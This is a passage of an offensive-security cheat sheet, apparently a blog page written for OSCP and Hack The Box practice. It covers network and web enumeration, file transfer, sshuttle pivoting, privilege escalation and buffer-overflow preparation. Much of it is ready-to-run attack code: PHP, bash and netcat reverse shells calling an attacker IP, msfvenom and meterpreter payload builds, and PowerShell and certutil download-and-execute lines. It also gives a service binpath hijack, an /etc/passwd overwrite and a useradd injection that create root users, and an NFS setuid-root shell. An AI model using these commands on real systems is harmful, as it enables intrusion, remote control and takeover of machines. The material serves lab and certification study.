				But this is basically the tools I tend to relie and use in this way the most.
				Hope is helpfull for you!</p>
				<h2 id="enumeration">Enumeration</h2>
				<h3 id="network-discoverie">Network discoverie</h3>
				<h4 id="nmap">Nmap</h4>
				<p>I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:</p>
				<pre><code class="language-console" data-lang="console">nmap -sV -O --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
				nmap -sC -sV -O --open -p- -oA nmap/full &lt;ip or cidr&gt;
				nmap -sU -p- -oA nmap/udp &lt;ip or cidr&gt;
				
				--top-ports only scan the N most common ports
				--open only show open ports
				-sC use the default scripts
				-sV detect versions
				-O detect Operating Systems
				-p- scan all the ports
				-oA save the output in normal format, grepable and xml
				-sU scan UDP ports
				</code></pre><p>Is also possible to specify scripts or ports:</p>
				<pre><code class="language-console" data-lang="console">nmap --scripts vuln,safe,discovery -p 443,80 &lt;ip or cidr&gt;
				</code></pre><p>If there are servers that could be not answering (ping), then add the flag -Pn (example of initial one):</p>
				<pre><code class="language-console" data-lang="console">nmap -Pn --top-ports 50 --open -oA nmap/initial &lt;ip or cidr&gt;
				</code></pre><h3 id="ports-discovery-without-nmap">Ports discovery (without nmap)</h3>
				<h4 id="nc--bash">nc + bash</h4>
				<p>If you get in a machine that doesn&rsquo;t have nmap installed, you can do a basic discovery of (for example), top 10 ports open in 192.168.30 by doing:</p>
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">top10<span style="color:#f92672">=(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span> nc -w <span style="color:#ae81ff">1</span> 192.168.30.253 $i <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is open&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is closed or filtered&#34;</span>; <span style="color:#66d9ef">done</span>
				</code></pre></div><h4 id="devtcpipport-or-devudpipport">/dev/tcp/ip/port or /dev/udp/ip/port</h4>
				<p>Alternatively, is possible to do the same than above but by using the special dev files <code>/dev/tcp/ip/port</code> or <code>/dev/udp/ip/port</code> (for example nc is not found):</p>
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">top10<span style="color:#f92672">=(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>; <span style="color:#66d9ef">for</span> i in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span> <span style="color:#f92672">(</span>echo &gt; /dev/tcp/192.168.30.253/<span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is open&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;Port </span>$i<span style="color:#e6db74"> is closed&#34;</span>; <span style="color:#66d9ef">done</span>
				</code></pre></div><p>Taking these last  examples, is straightforward to create a dummy script for scan a hole /24 net (for example):</p>
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
				</span><span style="color:#75715e"></span>subnet<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.30&#34;</span>
				top10<span style="color:#f92672">=(</span><span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">110</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">445</span> 3389<span style="color:#f92672">)</span>
				<span style="color:#66d9ef">for</span> host in <span style="color:#f92672">{</span>1..255<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
				<span style="color:#66d9ef">for</span> port in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>top10[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span>
				<span style="color:#f92672">(</span>echo &gt; /dev/tcp/<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Host </span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74"> has </span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74"> open&#34;</span> <span style="color:#f92672">||</span> echo <span style="color:#e6db74">&#34;Host </span><span style="color:#e6db74">${</span>subnet<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74"> has </span><span style="color:#e6db74">${</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74"> closed&#34;</span>
				<span style="color:#66d9ef">done</span>
				<span style="color:#66d9ef">done</span>
				</code></pre></div><h3 id="banner-grabbing-without-nmap">Banner grabbing (without nmap)</h3>
				<p>If nmap didn&rsquo;t grab banners (or is not installed), you can do it with <code>/dev/tcp/ip/port</code> <code>/dev/udp/ip/port</code> or by using telnet.</p>
				<h4 id="devtcpipport-or-devudpipport-1">/dev/tcp/ip/port or /dev/udp/ip/port</h4>
				<pre><code class="language-console" data-lang="console">cat &lt; /dev/tcp/192.168.30.253/22
				SSH-2.0-OpenSSH_6.2p2 Debian-6
				^C pressed here
				</code></pre><p>For doing it with udp ports is the same, but changing tcp for udp</p>
				<h4 id="telnet">telnet</h4>
				<pre><code class="language-console" data-lang="console">telnet 192.168.30.253 22
				SSH-2.0-OpenSSH_6.2p2 Debian-6
				^C pressed here
				</code></pre><h3 id="web-directoriefile-scanner">Web directorie/file scanner</h3>
				<h4 id="gobuster">Gobuster</h4>
				<p>Scan all the directories/files by extension:</p>
				<pre><code class="language-console" data-lang="console">gobuster dir -u http://192.168.24.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o webscan/gobuster-extensions
				</code></pre><p>For scanning without extensions, just take out the -x</p>
				<h4 id="nikto">Nikto</h4>
				<p>Sometimes Nikto shows juicy information, I tend to run it like:</p>
				<pre><code class="language-console" data-lang="console">nikto -Format txt -o webscan/nikto-initial -host http://192.168.24.24 -p 8080
				</code></pre><h4 id="fuff">fuff</h4>
				<p>Web fuzzer, <a href="https://github.com/ffuf/ffuf">you can get fuff here</a>, it basically bruteforces the dirs.</p>
				<pre><code class="language-console" data-lang="console">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.24.24/FUZZ
				</code></pre><h3 id="most-usefull-dictionaries-oscphtb">Most usefull dictionaries (OSCP/HTB)</h3>
				<pre><code class="language-console" data-lang="console">/usr/share/wordlists/rockyou.txt
				/usr/share/wordlists/wfuzz/others/common_pass.txt
				
				In seclists-pkg:
				
				/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
				/usr/share/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt
				/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
				</code></pre><h3 id="samba">Samba</h3>
				<h4 id="smbclient">smbclient</h4>
				<p>Check if there is anonymous login enabled:</p>
				<pre><code class="language-console" data-lang="console">smbclient -L 192.168.24.24
				</code></pre><h4 id="impacket">impacket</h4>
				<p>Is also possible to use impacket in the same way than smbclient to check for anonymous login (and a lot more as browse the shares) in case of incompatible versions.</p>
				<pre><code class="language-console" data-lang="console">
				/usr/share/doc/python3-impacket/examples/smbclient.py &quot;&quot;@192.168.24.24
				</code></pre><h4 id="smbmap">smbmap</h4>
				<p>Check which permissions we have in those shares (if there are):</p>
				<pre><code class="language-console" data-lang="console">smbmap -H 192.168.24.24
				Or having an user:
				smbmap -u ceso -H 192.168.24.24
				</code></pre><h4 id="version-nmap-didnt-detect-it">Version (nmap didn&rsquo;t detect it)</h4>
				<p>Sometimes nmap doesn&rsquo;t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.</p>
				
				<img src="/images/cheatsheet/smb-version-wireshark.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<h2 id="exfiltration">Exfiltration</h2>
				<h3 id="samba-1">Samba</h3>
				<p>Generate a samba server with Impacket:</p>
				<pre><code class="language-console" data-lang="console">impacket-smbserver tools /home/kali/tools
				</code></pre><h4 id="mount-in-windows">Mount in Windows</h4>
				<p>Mounting it in Windows with Powershell:</p>
				<pre><code class="language-console" data-lang="console">New-PSDrive -Name &quot;tools&quot; -PSProvider &quot;Filesystem&quot; -Root &quot;\\192.168.42.42\tools&quot;
				</code></pre><p>Mounting it without Powershell:</p>
				<pre><code class="language-console" data-lang="console">net use z: \\192.168.42.42\tools&quot;
				</code></pre><p>On windows, to list mounted shares, either Powershell or without it:</p>
				<pre><code class="language-console" data-lang="console">Powershell: Get-SMBShare
				Without Powershell: net share
				</code></pre><h4 id="mount-in-linux">Mount in Linux</h4>
				<p>Is needed to have installed cifs-utils, to install it (in debian based):</p>
				<pre><code class="language-console" data-lang="console">sudo apt-get install cifs-utils
				</code></pre><p>To mount it:</p>
				<pre><code class="language-console" data-lang="console">sudo mount -t cifs //192.168.42.42/tools ~/my_share/
				</code></pre><p>To list mounted shares:</p>
				<pre><code class="language-console" data-lang="console">mount | grep cifs
				grep cifs /proc/mount
				
				</code></pre><h3 id="http">HTTP</h3>
				<p>From your local attacker machine, create a http server with:</p>
				<pre><code class="language-console" data-lang="console">sudo python3 -m http.server 80
				sudo python2 -m SimpleHTTPServer 80
				</code></pre><p>It&rsquo;s also possible to specify which path to share, for example:</p>
				<pre><code class="language-console" data-lang="console">sudo python3 -m http.server 80 --dir /home/kali/tools
				</code></pre><h4 id="windows">Windows</h4>
				<pre><code class="language-console" data-lang="console">iex(new-object net.webclient).downloadstring(&quot;http://192.168.42.42/evil.ps1)
				certutil.exe -urlcache -split -f &quot;http://192.168.42.42/nc.exe&quot; nc.exe
				IWR -Uri &quot;http://192.168.42.42/n64.exe&quot; -Outfile &quot;n64.exe&quot;
				</code></pre><h4 id="linux">Linux</h4>
				<pre><code class="language-console" data-lang="console">curl http://192.168.42.42/evil.php --output evil.php
				</code></pre><h3 id="ftp">FTP</h3>
				<p>If there is an ftp server which we have access, we can upload files there through it, the &quot;&quot; is the same for both, windows or linux:</p>
				<pre><code class="language-console" data-lang="console">Connect and login with:
				
				ftp 192.168.42.42
				
				Upload the files with:
				
				put evil.py
				
				Sometimes is needed to enter in passive mode before doing anything, if is the case, just type:
				
				pass
				
				followed by enter
				</code></pre><h3 id="sockets">Sockets</h3>
				<p>Using nc/ncat is possible to create as a listener to upload/download stuff through them, the syntax for nc and ncat is basically the same.
				Create the socket with:</p>
				<pre><code class="language-console" data-lang="console">Attacker:
				nc -lvnp 443 &lt; evil.php
				
				For both cases from windows, the only difference is to write nc.exe
				
				Victim:
				nc -v 192.168.42.42 443 &gt; evil.php
				</code></pre><h3 id="rdp">RDP</h3>
				<p>If we have access to a windows machine with a valid user/credentials and this user is in the &ldquo;Remote Desktop Users&rdquo;, we can share a local directorie as a mount volume through rdp itself once we connect to the machine:</p>
				<pre><code class="language-console" data-lang="console">rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -
				</code></pre><h2 id="pivoting">Pivoting</h2>
				<p>It&rsquo;s possible to do pivoting by using proxychains, pure nc&rsquo;s or in case of linux just some fifo files (I will write them down this another methods down maybe in a future), I have used during all the OSCP an awesome tool called (sshuttle)[https://github.com/sshuttle/sshuttle] (it&rsquo;s a transparent proxy server that works like &ldquo;a vpn&rdquo;, and doesn&rsquo;t require with super rights, only thing needed is that the bastion server you will use, needs to have installed python) and sometimes some SSH Forwarding. Something worth to mention nmap doesn&rsquo;t work through sshuttle.</p>
				<h3 id="sshuttle">sshuttle</h3>
				<h4 id="one-hop">One hop</h4>
				<p>Let&rsquo;s say we are in an intranet and we have compromised a firewall that gives us access to the management net (fw.example.mgmt - ips 192.168.20.35 and 192.168.30.253 as the management ip), by using sshuttle we can create a &ldquo;vpn&rdquo; to talk directly to those servers, for that, we use:</p>
				<pre><code class="language-console" data-lang="console">sshuttle ceso@192.168.20.35 192.168.30.0/24
				</code></pre><h4 id="multi-hops">Multi-hops</h4>
				<p>Now imagine that after we broke up into the management net after some some enumeration, we ended to compromise a machine that has also access to a production environment (foreman.example.mgmt - ips 192.168.30.40 and 192.168.25.87), we can take advantage of sshuttle + ProxyCommand of ssh to create a &ldquo;vpn&rdquo; through this multiple hops, so&hellip;putting it down, this will be kind of as follow (the diagram is extremly simplified and just for the sake of illustrate this visually, so it doesn&rsquo;t intend to provide a 100% precise network diagram):</p>
				
				<img src="/images/cheatsheet/multiple-hop-sshuttle.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>To have that working, is needed to put the next conf in your ssh conf file (normally ~/.ssh/config. It&rsquo;s based on the example above, but is easy to extrapolate to different scenarios):</p>
				<pre><code class="language-console" data-lang="console">Host fw.example.mgmt
				Hostname 192.168.20.35
				User userOnFw
				IdentityFile ~/.ssh/priv_key_fw
				Host foreman.example.mgmt
				Hostname 192.168.30.40
				User root
				ProxyJump fw.example.mgmt
				IdentityFile ~/.ssh/priv_key_internal
				</code></pre><p>And now to setup the &ldquo;multiple hop vpn&rdquo;, run:</p>
				<pre><code class="language-console" data-lang="console">sshuttle -r foreman.example.mgmt -v 192.168.25.0/24 &amp;
				
				Later on is possible to connect from the local machine:
				ssh foo@192.168.25.74
				</code></pre><h2 id="reverse-shells">Reverse shells</h2>
				<h3 id="php">php</h3>
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> $sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>(<span style="color:#e6db74">&#34;192.168.42.42&#34;</span>,<span style="color:#e6db74">&#34;443&#34;</span>); $proc <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>(<span style="color:#e6db74">&#34;/bin/sh -i&#34;</span>, <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">0</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">1</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">2</span><span style="color:#f92672">=&gt;</span>$sock), $pipes); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
				</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">r</span> <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;192.168.42.42&#34;,443);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
				</code></pre></div><h3 id="bash">bash</h3>
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/192.168.42.42/443 0&gt;&amp;<span style="color:#ae81ff">1</span>
				</code></pre></div><h3 id="sh--nc">sh + nc</h3>
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;<span style="color:#ae81ff">1</span> | nc 192.168.42.42 <span style="color:#ae81ff">443</span> &gt;/tmp/f
				</code></pre></div><h3 id="perl-example-deploy-as-cgi-bin">Perl (example deploy as cgi-bin)</h3>
				<pre><code class="language-console" data-lang="console">msfvenom -p cmd/unix/reverse_perl LHOST=&quot;192.168.42.42&quot; LPORT=443 -f raw -o reverse_shell.cgi
				</code></pre><h3 id="java-example-to-deploy-on-tomcat">Java (example to deploy on tomcat)</h3>
				<pre><code class="language-console" data-lang="console">msfvenom -p java/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f war  rev_shell.war
				</code></pre><h3 id="windows-htpp-download-reverse-shell">Windows HTPP download reverse shell</h3>
				<pre><code class="language-console" data-lang="console">msfvenom -a x86 --platform windows -p windows/exec CMD=&quot;powershell \&quot;IEX(New-Object Net.WebClient).downloadString('http://192.168.42.42/Invoke-PowerShellTcp.ps1')\&quot;&quot; -e x86/unicode_mixed BufferRegister=EAX -f python
				</code></pre><h3 id="windows-staged-reverse-tcp">Windows staged reverse TCP</h3>
				<pre><code class="language-console" data-lang="console"> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
				</code></pre><h3 id="windows-stageless-reverse-tcp">Windows stageless reverse TCP</h3>
				<pre><code class="language-console" data-lang="console">msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.42.42 LPORT=443 -f exe -o &lt;output_name.format&gt;
				</code></pre><h3 id="linux-staged-reverse-tcp">Linux staged reverse TCP</h3>
				<pre><code class="language-console" data-lang="console">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &lt;outout_name&gt;.elf
				</code></pre><h3 id="linux-staged-reverse-tcp-1">Linux staged reverse TCP</h3>
				<pre><code class="language-console" data-lang="console">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &lt;outout_name&gt;.elf
				</code></pre><h2 id="privilege-escalation">Privilege escalation</h2>
				<h3 id="windows-1">Windows</h3>
				<h4 id="run-as">Run-As</h4>
				<pre><code class="language-console" data-lang="console">PS C:\&gt; $secstr = New-Object -TypeName System.Security.SecureString
				PS C:\&gt; $username = &quot;&lt;domain&gt;\&lt;user&gt;&quot;
				PS C:\&gt; $password = '&lt;password&gt;'
				PS C:\&gt; $secstr = New-Object -TypeName System.Security.SecureString
				PS C:\&gt; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
				PS C:\&gt; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
				PS C:\&gt; Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://&lt;ip/host&gt;:&lt;port&gt;/path/to/file.evil') } -Credential $cred -Computer localhost
				-----------------------------------------------------------------------------------------------------
				Invoke-Command -ComputerName localhost -Creadential $credential -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.4 1338 -e cmd.exe }
				</code></pre><h4 id="incorrect-permisions-in-services-sc-config-binpath">Incorrect permisions in services (sc config binpath)</h4>
				<p>Binpath is set as running <code>cmd.exe</code> passing a commad to execute to it (so once the process dies, the one executed by it so the command to <code>cmd.exe</code> remains):</p>
				<pre><code class="language-console" data-lang="console">sc config upnphost binpath= &quot;C:\WINDOWS\System32\cmd.exe /k C:\inetpub\wwwroot\nc.exe -nv 192.168.42.42 443 -e C:\WINDOWS\System32\cmd.exe&quot;
				</code></pre><h4 id="sam--system--security">SAM + SYSTEM + Security</h4>
				<p>If those 3 files are in your hands (you could download to your attacker machine), you can dump hashes and crack them:</p>
				<pre><code class="language-console" data-lang="console">/usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.bak -security SECURITY.bak -system SYSTEM.bak LOCAL
				
				sudo john dumped_hashes --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
				</code></pre><h3 id="linux-1">Linux</h3>
				<h4 id="homeuseropenssl-ep-empty-capabilities">/home/user/openssl =ep (empty capabilities)</h4>
				<p>Make 2 copies of passwd, one as backup of the original, and one that will be used as custom:</p>
				<pre><code class="language-console" data-lang="console">cp /etc/passwd /tmp/passwd.orig
				cp /etc/passwd /tmp/passwd.custom
				</code></pre><p>Now, a custom user will be created and added to <code>/tmp/passwd.custom</code> with <code>customPassword</code> and as root user (UID = GID = 0):</p>
				<pre><code class="language-console" data-lang="console">echo 'ceso:'&quot;$( openssl passwd -6 -salt xyz customPassword )&quot;':0:0::/tmp:/bin/bash' &gt;&gt; /tmp/passwd.custom
				</code></pre><p>Now, create a custom <code>key.pem</code> and <code>cert.pem</code> with openssl:</p>
				<pre><code class="language-console" data-lang="console">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
				</code></pre><p>Encrypt the new custom passwd:</p>
				<pre><code class="language-console" data-lang="console">openssl smime -encrypt -aes256 -in /tmp/passwd.custom -binary -outform DER -out /tmp/passwd.enc /tmp/cert.pem
				</code></pre><p>Now, decrypt the custom passwd overwritting in the process the real one (<code>/etc/passwd</code>):</p>
				<pre><code class="language-console" data-lang="console">cd /
				/home/ldapuser1/openssl smime -decrypt -in /tmp/passwd.enc -inform DER -inkey /tmp/key.pem -out /etc/passwd
				</code></pre><p>And finally, just login with the user created with root privileges by using <code>customPassword</code>:</p>
				<pre><code class="language-console" data-lang="console">su - ceso
				</code></pre><h4 id="command-web-injection-add-user">Command web injection: add user</h4>
				<pre><code class="language-console" data-lang="console">/usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed 's/:4242:0:/:0:0:/' /etc/passwd -i
				</code></pre><h4 id="nfs-no_root_squashinsecurerw">NFS; no_root_squash,insecure,rw</h4>
				<p>If <code>/etc/exports</code> has a line like:</p>
				<pre><code class="language-console" data-lang="console">/srv/pelota 192.168.42.0/24(insecure,rw)
				/srv/pelota 127.0.0.1/32(no_root_squash,insecure,rw)
				</code></pre><p>NFS is being exported and you and you have ssh access to the machine.
				From your attacker machine <strong>while logged as root</strong> user run:</p>
				<pre><code class="language-console" data-lang="console">ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049
				mount -t nfs 127.0.0.1:/srv/pelota my_share
				cd my_share
				cat &gt; shell.c&lt;&lt;EOF
				#include &lt;unistd.h&gt;
				int main(){
				setuid(0);
				setgid(0);
				system(&quot;/bin/bash&quot;);
				}
				EOF
				gcc shell.c -o shell
				chmod u+s shell
				</code></pre><p>Now from inside a SSH session on the victim machine (in this example <code>192.168.42.32</code>):</p>
				<pre><code class="language-console" data-lang="console">bash-4.2$ cd /srv/pelota
				bash-4.2$ ./shell
				bash-4.2# id
				uid=0(root) gid=0(root) groups=0(root),1000(megumin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
				</code></pre><h2 id="good-to-know-either-windows-andor-linux">Good to know (either Windows and/or Linux)</h2>
				<h3 id="arch-cross-compile-exploit-and-diff-glibc-version">Arch cross compile exploit (and diff glibc version)</h3>
				<pre><code class="language-console" data-lang="console">gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
				</code></pre><h3 id="ip-restriction-at-application-level-bypass">IP restriction at application level, bypass</h3>
				<p>Try to send a request modifying the HTTP header by adding:</p>
				<pre><code class="language-console" data-lang="console">X-Forwarder-For: &lt;ip allowed&gt;
				</code></pre><h3 id="windows---check-os-information">Windows - check OS information</h3>
				<pre><code class="language-console" data-lang="console">systeminfo
				ver
				</code></pre><h3 id="windows---check-architecture">Windows - check architecture</h3>
				<pre><code class="language-console" data-lang="console">wmic os get osarchitecture
				echo %PROCESSOR_ARCHITECTURE%
				</code></pre><h3 id="powershell--running-as-32-or-64-bits">Powershell  running as 32 or 64 bits</h3>
				<pre><code class="language-console" data-lang="console">[Environment]::Is64BitProcess
				</code></pre><h3 id="linux-lfi---intesresting-files-to-look-after">Linux LFI - intesresting files to look after</h3>
				<pre><code class="language-console" data-lang="console">/proc/self/status
				/proc/self/environ
				/etc/passwd
				/etc/hosts
				/etc/exports
				</code></pre><h2 id="simple-buffer-overflow-32-bits-no-aslr-and-no-dep">Simple Buffer Overflow (32 bits, NO ASLR and NO DEP)</h2>
				<h3 id="summarized-steps">Summarized steps</h3>
				<ul>
				<li>0 - Crash the application</li>
				<li>1 - Fuzzing (find aprox number of bytes where the crash took place)</li>
				<li>2 - Find offset</li>
				<li>3 - EIP control</li>
				<li>4 - Check for enough space on buffer</li>
				<li>5 - Badchars counting</li>
				<li>6 - Find return address (JMP ESP)</li>
				<li>7 - Create payload</li>
				</ul>
				<h3 id="fuzzing-example-with-vulnserver--spike-on-trun-command">Fuzzing: example with vulnserver + spike on TRUN command</h3>
				<pre><code class="language-console" data-lang="console">cat &gt; trun.spk &lt;&lt;EOF
				s_readline();
				s_string(&quot;TRUN &quot;);
				s_string_variable(&quot;COMMAND&quot;);
				EOF
				</code></pre><p>Now, start wireshark filtering on the target IP/PORT below and run the <code>trun.spk</code>:</p>
				<pre><code class="language-console" data-lang="console">generic_send_tcp 172.16.42.131 9999 trun.spk 0 0
				</code></pre><p>Once a crash takes place, go to wireshark to locate the crash.</p>
				<h3 id="badchars">Badchars</h3>
				<p>From the block below, the next ones were not included (most common badchars):</p>
				<pre><code class="language-console" data-lang="console">\x00 --&gt; null byte
				\x0a --&gt; new line character (AKA &quot;\n&quot;)
				</code></pre><p>So&hellip;actual list of badchars:</p>
				<pre><code class="language-console" data-lang="console">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
				</code></pre><h3 id="usefull-tools-on-kali-linux">Usefull tools (on Kali Linux)</h3>
				<h4 id="create_pattern">create_pattern</h4>
				<pre><code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
				/usr/bin/msf-pattern_create
				</code></pre><h4 id="pattern_offset">pattern_offset</h4>
				<pre><code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
				/usr/bin/msf-pattern_offset
				</code></pre><h4 id="nasm_shell">nasm_shell</h4>
				<pre><code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
				/usr/bin/msf-nasm_shell
				</code></pre><h4 id="msfvenom">msfvenom</h4>
				<pre><code class="language-console" data-lang="console">/usr/share/metasploit-framework/msfvenom
				/usr/bin/msfvenom
				</code></pre><h3 id="shellcode-poc-calcexe">Shellcode POC: calc.exe</h3>
